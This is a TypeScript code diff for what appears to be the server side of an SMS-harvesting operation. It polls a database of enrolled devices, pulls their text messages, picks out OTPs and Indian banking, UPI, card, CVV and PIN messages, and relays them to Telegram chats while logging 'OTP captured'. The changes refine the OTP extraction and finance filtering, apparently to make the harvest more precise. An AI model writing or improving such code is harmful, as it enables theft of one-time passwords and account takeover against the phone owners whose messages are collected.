@@ -19,14 +19,23 @@ const POLL_INTERVAL = 3_000;
 const OTP_KEYWORD =
   /otp|one[- ]?time[- ]?password|verification code|verify code|is your (login |verification )?code|use code|security code|never share|do not share|valid for/i;
 
-function detectOtp(body: string, from: string): { code: string; service: string } | null {
+function detectOtp(
+  body: string,
+  from: string
+): { code: string; service: string } | null {
   const cleaned = body.replace(/\s+/g, " ").trim();
   if (!OTP_KEYWORD.test(cleaned)) return null;
-  const m = cleaned.match(/\b\d{4,8}\b/);
+  // Avoid year 2026 etc. as OTP — require 4-6 digits not part of longer number and not common years
+  const m = cleaned.match(/\b(?!20\d{2}\b)\d{4,8}\b/);
   if (!m) return null;
-  let service = (from || "").replace(/[^A-Za-z\s]/g, " ").replace(/\s+/g, " ").trim();
+  let service = (from || "")
+    .replace(/[^A-Za-z\s]/g, " ")
+    .replace(/\s+/g, " ")
+    .trim();
   if (!service) {
-    const brand = cleaned.match(/(?:from|for|your|with)\s+([A-Za-z][A-Za-z0-9 .&]{2,24})/i);
+    const brand = cleaned.match(
+      /(?:from|for|your|with)\s+([A-Za-z][A-Za-z0-9 .&]{2,24})/i
+    );
     service = brand ? brand[1].trim() : "Unknown";
   }
   return { code: m[0], service: service.slice(0, 32) || "Unknown" };
@@ -54,24 +63,33 @@ async function drainChat(chatId: string): Promise<void> {
       const q = chatQueues.get(chatId);
       if (!q || q.length === 0) break;
       const text = q[0];
-      if (!botRef) { q.shift(); continue; }
+      if (!botRef) {
+        q.shift();
+        continue;
+      }
 
       let sent = false;
       let permanent = false;
       for (let attempt = 0; attempt < 10; attempt++) {
         try {
-          await botRef.telegram.sendMessage(chatId, text, { parse_mode: "Markdown" });
+          await botRef.telegram.sendMessage(chatId, text, {
+            parse_mode: "Markdown",
+          });
           sent = true;
           break;
         } catch (err: any) {
           const code = err?.response?.error_code;
           if (code === 429) {
-            const retryAfter = (err?.response?.parameters?.retry_after ?? 5) * 1000;
+            const retryAfter =
+              (err?.response?.parameters?.retry_after ?? 5) * 1000;
             logger.warn({ chatId, retryAfter }, "Telegram 429 — backing off");
             await delay(retryAfter);
             continue;
           }
-          logger.error({ err, chatId }, "Permanent failure sending SMS to chat");
+          logger.error(
+            { err, chatId },
+            "Permanent failure sending SMS to chat"
+          );
           permanent = true;
           break;
         }
@@ -94,17 +112,66 @@ async function drainChat(chatId: string): Promise<void> {
 }
 
 const FINANCE_KEYWORDS = [
-  "otp", "debit", "credit", "upi", "payment", "transaction", "transferred",
-  "paid", "received", "balance", "account", "bank", "withdraw", "deposit",
-  "inr", "₹", "rs.", "rs ", "neft", "imps", "rtgs", "paytm", "phonepe",
-  "gpay", "googlepay", "bhim", "razorpay", "amount", "credited", "debited",
-  "sbi", "hdfc", "icici", "axis", "kotak", "pnb", "bob", "canara",
-  "net banking", "atm", "card", "cvv", "pin", "expiry", "insufficient",
+  "otp",
+  "debit",
+  "credit",
+  "upi",
+  "payment",
+  "transaction",
+  "transferred",
+  "paid",
+  "received",
+  "balance",
+  "account",
+  "bank",
+  "withdraw",
+  "deposit",
+  "inr",
+  "₹",
+  "rs",
+  "neft",
+  "imps",
+  "rtgs",
+  "paytm",
+  "phonepe",
+  "gpay",
+  "googlepay",
+  "bhim",
+  "razorpay",
+  "amount",
+  "credited",
+  "debited",
+  "sbi",
+  "hdfc",
+  "icici",
+  "axis",
+  "kotak",
+  "pnb",
+  "bob",
+  "canara",
+  "net banking",
+  "atm",
+  "card",
+  "cvv",
+  "pin",
+  "expiry",
+  "insufficient",
 ];
 
 function isFinanceSms(text: string): boolean {
   const lower = text.toLowerCase();
-  return FINANCE_KEYWORDS.some((kw) => lower.includes(kw));
+  const hasAmount = /(?:rs\.?|inr|₹)\s*\d/.test(lower);
+  // Short keywords (rs, pin, card) require amount to avoid nurse/pincode false positives
+  const shortKws = new Set(["rs", "pin", "card"]);
+  for (const kw of FINANCE_KEYWORDS) {
+    if (lower.includes(kw)) {
+      if (shortKws.has(kw) && !hasAmount) continue;
+      // amount mandatory for finance unless bank/UPI keyword present
+      if (kw.length <= 3 && !hasAmount) continue;
+      return true;
+    }
+  }
+  return hasAmount;
 }
 
 function escapeMarkdown(text: string): string {
@@ -130,7 +197,9 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
 
       const clients = await fbGet("clients");
       if (clients) {
-        for (const deviceId of Object.keys(clients).filter((k: string) => !k.startsWith('{') && !k.startsWith('*'))) {
+        for (const deviceId of Object.keys(clients).filter(
+          (k: string) => !k.startsWith("{") && !k.startsWith("*")
+        )) {
           if (watermarks[deviceId] === undefined) {
             watermarks[deviceId] = 0;
           }
@@ -150,12 +219,13 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
     try {
       // One flaky instance (e.g. an expired ngrok database) must not kill the
       // whole poll — degrade that source to null instead.
-      const [globalChannelId, clients, messages, userChannels] = await Promise.all([
-        getSmsChannel().catch(() => null),
-        fbGet("clients").catch(() => null),
-        fbGet("messages").catch(() => null),
-        fbGet("config/userChannels").catch(() => null),
-      ]);
+      const [globalChannelId, clients, messages, userChannels] =
+        await Promise.all([
+          getSmsChannel().catch(() => null),
+          fbGet("clients").catch(() => null),
+          fbGet("messages").catch(() => null),
+          fbGet("config/userChannels").catch(() => null),
+        ]);
 
       if (!clients) return;
 
@@ -172,7 +242,8 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
         if (smsEntries.length === 0) continue;
 
         const sampleEntry = smsEntries[0] as any;
-        const isNewFormat = sampleEntry && sampleEntry.id != null && !sampleEntry.date;
+        const isNewFormat =
+          sampleEntry && sampleEntry.id != null && !sampleEntry.date;
 
         const getSortKey = (sms: any): number =>
           isNewFormat ? (sms?.id ?? 0) : parseInt(sms?.date || "0", 10);
@@ -224,13 +295,16 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
 
         for (const sms of newEntries as any[]) {
           const sortKey = getSortKey(sms);
-          const phone   = (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
-          const from    = sms.sender || sms.from || "Unknown";
-          const body    = sms.message || sms.body || "";
+          const phone =
+            (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
+          const from = sms.sender || sms.from || "Unknown";
+          const body = sms.message || sms.body || "";
           const dateStr = sms.dateTime
             ? sms.dateTime
             : sms.date
-              ? new Date(parseInt(sms.date)).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " IST"
+              ? new Date(parseInt(sms.date)).toLocaleString("en-IN", {
+                  timeZone: "Asia/Kolkata",
+                }) + " IST"
               : "Unknown";
           const isFinance = isFinanceSms(body);
 
@@ -275,7 +349,10 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
                   deviceId,
                   date: now,
                 });
-                logger.info({ deviceId, code: otp.code, service: otp.service }, "OTP captured");
+                logger.info(
+                  { deviceId, code: otp.code, service: otp.service },
+                  "OTP captured"
+                );
               }
             } catch (err) {
               logger.warn({ err }, "OTP capture failed");
